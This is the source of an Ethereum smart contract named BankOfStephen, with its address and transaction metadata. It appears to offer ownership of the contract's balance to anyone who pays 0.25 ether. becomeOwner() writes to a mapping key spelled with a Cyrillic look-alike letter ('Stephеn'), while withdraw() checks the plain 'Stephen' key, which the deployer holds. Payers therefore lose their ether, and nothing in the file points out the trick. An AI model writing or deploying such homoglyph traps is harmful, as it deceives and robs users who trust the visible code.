
//Address: 0xf5615138a7f2605e382375fa33ab368661e017ff
//Contract name: BankOfStephen
//Balance: 0 Ether
//Verification Date: 5/21/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.24;

contract BankOfStephen{

mapping(bytes32 => address) private owner;

constructor() public{
    owner['Stephen'] = msg.sender;
}

function becomeOwner() public payable{
    require(msg.value >= 0.25 ether);        
    owner['Stephеn'] = msg.sender; 
}

function withdraw() public{
    require(owner['Stephen'] == msg.sender);
    msg.sender.transfer(address(this).balance);
}

function() public payable {}

}
